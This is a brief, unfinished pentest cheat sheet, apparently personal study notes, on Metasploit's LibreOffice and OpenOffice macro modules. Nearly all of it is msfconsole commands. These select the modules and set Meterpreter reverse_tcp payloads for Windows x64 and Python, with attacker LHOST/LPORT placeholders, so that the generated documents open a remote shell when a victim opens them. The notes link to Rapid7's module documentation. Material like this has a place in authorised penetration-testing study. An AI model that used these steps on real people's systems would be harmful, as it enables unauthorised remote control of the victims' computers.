# Metasploit

TODO: Fill in the information

## LibreOffice Macro

```
msf > use exploit/multi/fileformat/libreoffice_macro_exec

set filename 
```

## OpenOffice Macro

```
msf > use exploit/multi/misc/openoffice_document_macro

set target 0

set payload windows/x64/meterpreter/reverse_tcp
```

```
set target 1

set payload python/meterpreter/reverse_tcp
```

```
set lhost <IP>

set lport <PORT>
```

---
## References

- [Rapid7: Metasploit Framework Exploit FileFormat LibreOffice Macro Exec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/fileformat/libreoffice_macro_exec.md)

- [Rapid7: Metasploit Framework Exploit Miscellaneous OpenOffice Macro Exec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/misc/openoffice_document_macro.md)